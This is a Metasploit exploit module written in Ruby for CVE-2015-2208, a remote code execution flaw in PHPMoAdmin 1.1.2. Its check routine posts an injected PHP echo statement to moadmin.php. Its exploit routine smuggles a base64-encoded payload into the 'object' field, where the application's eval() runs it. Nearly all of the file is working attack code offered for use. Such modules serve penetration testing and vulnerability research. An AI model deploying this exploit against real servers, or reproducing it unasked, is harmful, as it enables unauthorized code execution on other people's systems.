##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'


class Metasploit4 < Msf::Exploit::Remote

  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'PHPMoAdmin 1.1.2 Remote Code Execution',
      'Description'    => %q{
        This module exploits an arbitrary PHP command execution vulnerability due to a
        dangerous use of eval() in PHPMoAdmin.
      },
      'Author'         =>
        [
          'Pichaya Morimoto pichaya[at]ieee.org', # Public PoC
          'Ricardo Jorge Borges de Almeida <ricardojba1[at]gmail.com>', # Metasploit module
        ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2015-2208' ],
          [ 'EDB', '36251' ],
          [ 'URL', 'http://seclists.org/fulldisclosure/2015/Mar/19' ],
          [ 'URL', 'http://seclists.org/oss-sec/2015/q1/743' ]
        ],
      'Privileged'     => false,
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          [ 'PHPMoAdmin', { }  ],
        ],
      'DisclosureDate' => 'Mar 03 2015',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, "The URI path of the PHPMoAdmin page", "/"])
      ], self.class)
  end

  def check
    testrun = Rex::Text::rand_text_alpha(10)
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri,'moadmin.php'),
      'method'    => 'POST',
      'vars_post' =>
      {
        'object'  => "1;echo '#{testrun}';exit",
      }
    })

    if res and res.body.include?(testrun)
      return Exploit::CheckCode::Vulnerable
    end

    Exploit::CheckCode::Safe
  end

  def exploit

    print_status("Executing payload...")

    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri,'moadmin.php'),
      'method'    => 'POST',
      'vars_post' =>
      {
        'object'  => "1;eval(base64_decode('#{Rex::Text.encode_base64(payload.encoded)}'));exit"
      }
    })

  end
end

